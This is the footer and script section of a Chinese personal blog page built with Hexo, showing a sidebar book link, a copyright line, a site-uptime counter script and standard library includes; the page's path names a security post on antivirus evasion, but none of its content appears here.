<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/" title="《人间失格》太宰治">《人间失格》太宰治</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
  </div>

<!--   自定义开启一个网站的运行时间 -->
  <div class="site-uptime">
    Site uptime: <span id="site-uptime"></span>
  </div>
  <script>
    var siteUptimeElement = document.getElementById('site-uptime');
    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
    setInterval(function() {
      var currentTime = new Date();
      var uptime = formatUptime(currentTime - siteSetupDate);
      siteUptimeElement.textContent = uptime;
    }, 1000);

    function formatUptime(milliseconds) {
      var seconds = Math.floor(milliseconds / 1000);
      var minutes = Math.floor(seconds / 60);
      var hours = Math.floor(minutes / 60);
      var days = Math.floor(hours / 24);

      var uptime = '';
      if (days > 0) {
        uptime += days + '天 ';
      }
      if (hours > 0) {
        uptime += (hours % 24) + '时 ';
      }
      if (minutes > 0) {
        uptime += (minutes % 60) + '分 ';
      }
      uptime += (seconds % 60) + '秒';

      return uptime;
    }
  </script>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/07/04/SAFE/10 免杀对抗/',
    favicon: {
      show: "Cryp71c3",
      hide: "十年磨一剑"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
